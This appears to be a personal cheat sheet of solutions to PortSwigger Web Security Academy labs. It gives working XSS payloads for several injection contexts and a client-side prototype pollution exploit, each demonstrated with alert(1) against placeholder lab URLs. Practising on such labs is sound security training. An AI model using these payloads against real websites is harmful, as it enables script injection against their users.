## XSS with Access key (Canonical Link tag)

**Chapter:**

https://portswigger.net/web-security/cross-site-scripting/contexts

**Lab:** 

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

**Limitation:** Only on Chrome

**Solution:**

https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

Press Alt+x on keyboard to get alert

## XSS within <script>

**Chapter:** 
  
https://portswigger.net/web-security/cross-site-scripting/contexts
**Lab:** 
  
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped
**Limitations:** NA
**solution:** 
  
</script><script>alert(1)</script>


## Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

**Chapter:**

https://portswigger.net/web-security/cross-site-scripting/contexts
  
**Lab:**

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped
  
**Limitations:** NA

**Solution:** 

\'-alert(1)//


## Reflected XSS in a JavaScript URL with some characters blocked

**Chapter:** 

https://portswigger.net/web-security/cross-site-scripting/contexts
  
**Lab:**

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked
  
**Limitations:** NA

**Solution:** 

``` https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27 ```



## Client-side prototype pollution via browser APIs 

**Chapter:**
https://portswigger.net/web-security/prototype-pollution/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis
  
**Lab:**
https://portswigger.net/web-security/prototype-pollution/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis
  
**Limitations:** NA


**Solution:** 
/?__proto__[value]=data:,alert(1);

 Identify a gadget 
 Observe that the next line uses the Object.defineProperty() method to make the transport_url unwritable and unconfigurable. However, notice that it doesn't define a value property. 
 Craft an exploit
 /?__proto__[value]=foo
In the browser DevTools panel, go to the Elements tab and study the HTML content of the page. Observe that a <script> element has been rendered on the page, with the src attribute foo. 
  
 ### usign DOM invader
  
 Enable DOM Invader and enable the prototype pollution option. 
 Scan for gadgets
 Exploit



# Template:
## Topic Here 

**Chapter:**
  
**Lab:**

  
**Limitations:** NA

**Solution:** 


  **solution:** 
